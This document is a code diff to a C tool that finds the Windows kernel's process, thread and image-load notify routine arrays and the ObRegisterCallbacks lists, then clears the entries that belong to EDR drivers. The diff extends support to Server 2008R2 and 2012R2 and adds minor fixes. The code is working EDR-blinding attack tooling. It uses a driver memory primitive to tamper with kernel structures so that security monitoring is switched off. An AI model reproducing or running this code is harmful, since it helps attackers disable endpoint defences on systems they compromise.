@@ -260,7 +260,6 @@ INT64 GetPspNotifyRoutineArray(CHAR* KernelCallbackRegFunc) {
 	INT64 PsSetCallbacksNotifyRoutineAddress = GetFuncAddress((CHAR*)"ntoskrnl.exe", KernelCallbackRegFunc);
 	if (PsSetCallbacksNotifyRoutineAddress == 0) return 0;
 
-
 	INT count = 0;
 	INT64 PspSetCallbackssNotifyRoutineAddress = 0;
 	UINT64 PspOffset = 0;
@@ -289,8 +288,8 @@ INT64 GetPspNotifyRoutineArray(CHAR* KernelCallbackRegFunc) {
 			PspOffset = PspOffset | 0xffffffff00000000; 
 
 		PspSetCallbackssNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress + PspOffset + 5;
-
 		//printf("PspSetCallbackssNotifyRoutineAddress: %I64x\n", PspSetCallbackssNotifyRoutineAddress);
+		
 	}
 	else if (dwMajor == 6) {
 		PspSetCallbackssNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress;
@@ -299,13 +298,12 @@ INT64 GetPspNotifyRoutineArray(CHAR* KernelCallbackRegFunc) {
 		printf("Unsupported operating system version.\n");
 		return 0;
 	}
-
+	
 	BYTE SearchByte1 = 0x4C;
+	BYTE SearchByte1_1 = 0x48;
 	BYTE SearchByte2 = 0x8D;
 	BYTE bArray[3] = { 0 };
 	count = 0;
-	INT64 back = PspSetCallbackssNotifyRoutineAddress;
-	BOOL stop = FALSE;
 	while (count <= 200) {
 		DriverWriteMemery((VOID*)PspSetCallbackssNotifyRoutineAddress, bArray, 3);
 		if (bArray[0] == SearchByte1 && bArray[1] == SearchByte2) {
@@ -314,22 +312,22 @@ INT64 GetPspNotifyRoutineArray(CHAR* KernelCallbackRegFunc) {
 				break;
 			}
 		}
+		else if (bArray[0] == SearchByte1_1 && bArray[1] == SearchByte2) { //2008R2
+			if ((bArray[2] == 0x0D) || (bArray[2] == 0x15) || (bArray[2] == 0x1D) || (bArray[2] == 0x25) || (bArray[2] == 0x2D) || (bArray[2] == 0x35) || (bArray[2] == 0x3D))
+			{
+				break;
+			}
+		}
+
 		PspSetCallbackssNotifyRoutineAddress = PspSetCallbackssNotifyRoutineAddress + 1;
 		if (count == 200)
 		{
-			SearchByte1 = 0x48;
-			count = -1;
-			PspSetCallbackssNotifyRoutineAddress = back;
-			if (stop)
-			{
-				printf("%s:The second level LEA instruction was not found and the PspSetCallbackssNotifyRoutineAddress array could not be located.\n", KernelCallbackRegFunc);
-				return 0;
-			}
-			stop = true;
+			printf("%s:The second level LEA instruction was not found and the PspSetCallbackssNotifyRoutineAddress array could not be located.\n", KernelCallbackRegFunc);
+			return 0;
 		}
 		count++;
 	}
-
+	//printf("PspSetCallbackssNotifyRoutineAddress:%I64x\n", PspSetCallbackssNotifyRoutineAddress);
 	PspOffset = 0;
 	for (int i = 6, k = 24; i > 2; i--, k = k - 8) {
 
@@ -397,6 +395,7 @@ VOID PrintAndClearCallBack(INT64 PspNotifyRoutineAddress, CHAR* CallBackRegFunc)
 		DriverWriteMemery((VOID*)(PspNotifyRoutineAddress + (k * 8)), &buffer, 8);
 		if (buffer == 0) continue;
 		INT64 tmpaddr = ((INT64)buffer >> 4) << 4;
+		if (tmpaddr == 0) continue;
 		DriverWriteMemery((VOID*)(tmpaddr + 8), &buffer, 8);
 		INT64 DriverCallBackFuncAddr = (INT64)buffer;
 		CHAR* DriverName = GetDriverName(DriverCallBackFuncAddr);
@@ -417,26 +416,30 @@ VOID ClearThreeCallBack() {
 	INT64 PspCreateProcessNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateProcessNotifyRoutine");
 	INT64 PspCreateThreadNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateThreadNotifyRoutine");
 	INT64 PspLoadImageNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetLoadImageNotifyRoutine");
+
+	//printf("PspCreateProcessNotifyRoutineAddress: %I64x\n", PspCreateProcessNotifyRoutineAddress);
+	//printf("PspCreateThreadNotifyRoutineAddress: %I64x\n", PspCreateThreadNotifyRoutineAddress);
+	//printf("PspLoadImageNotifyRoutineAddress: %I64x\n", PspLoadImageNotifyRoutineAddress);
+
 	if (PspCreateProcessNotifyRoutineAddress) {
 		PrintAndClearCallBack(PspCreateProcessNotifyRoutineAddress, (CHAR*)"PsSetCreateProcessNotifyRoutine");
 	}
 	else {
 		printf("Failed to obtain process callback address.\n");
 	}
-
 	if (PspCreateThreadNotifyRoutineAddress) {
 		PrintAndClearCallBack(PspCreateThreadNotifyRoutineAddress, (CHAR*)"PsSetCreateThreadNotifyRoutine");
 	}
 	else {
 		printf("Failed to obtain thread callback address.\n");
 	}
-
 	if (PspLoadImageNotifyRoutineAddress) {
 		PrintAndClearCallBack(PspLoadImageNotifyRoutineAddress, (CHAR*)"PsSetLoadImageNotifyRoutine");
 	}
 	else {
 		printf("Image loading callback address acquisition failed.\n");
 	}
+
 	return;
 
 }
@@ -488,7 +491,13 @@ VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
 		CallbackListAddr = PsProcessTypeAddr + 0xC8;
 	}
 	else if (dwMajor == 6) {
-		CallbackListAddr = PsProcessTypeAddr + 0xC0;
+		if (dwMinorVersion == 3) {//2012R2
+			CallbackListAddr = PsProcessTypeAddr + 0xC8;
+		}
+		else {
+			CallbackListAddr = PsProcessTypeAddr + 0xC0;
+		}
+		
 	}
 	else {
 		printf("Operating systems not supported by ObRegisterCallbacks.\n");
@@ -519,7 +528,7 @@ VOID RemoveObRegisterCallbacks(INT64 PsProcessTypeAddr, INT flag) {
 		DriverWriteMemery((VOID*)(Flink + 40), &EDRPreOperation, 8);
 		INT64 EDRPostOperation = 0;
 		DriverWriteMemery((VOID*)(Flink + 48), &EDRPostOperation, 8);
-		//printf("%s: EDRPreOperation: %I64x , %s: EDRPostOperation: %I64x \n", DisplayDriverName(EDRPreOperation), EDRPreOperation, DisplayDriverName(EDRPostOperation), EDRPostOperation);
+		//printf("%s: EDRPreOperation: %I64x , %s: EDRPostOperation: %I64x \n", GetDriverName(EDRPreOperation), EDRPreOperation, GetDriverName(EDRPostOperation), EDRPostOperation);
 		CHAR* DriverName1 = GetDriverName(EDRPreOperation);
 		if (DriverName1 != NULL) {
 			if (IsEDR(DriverName1)) {
@@ -583,6 +592,8 @@ VOID ClearObRegisterCallbacks() {
 	printf("----------------------------------------------------\n");
 	printf("Drivers that register ObRegisterCallbacks callbacks: \n----------------------------------------------------\n\n");
 
+	/*printf("PsProcessTypeAddr: %I64x\n", PsProcessTypeAddr);
+	printf("PsThreadTypeAddr: %I64x\n", PsThreadTypeAddr);*/
 	RemoveObRegisterCallbacks(PsProcessTypeAddr, 1);
 	RemoveObRegisterCallbacks(PsThreadTypeAddr, 2);
 
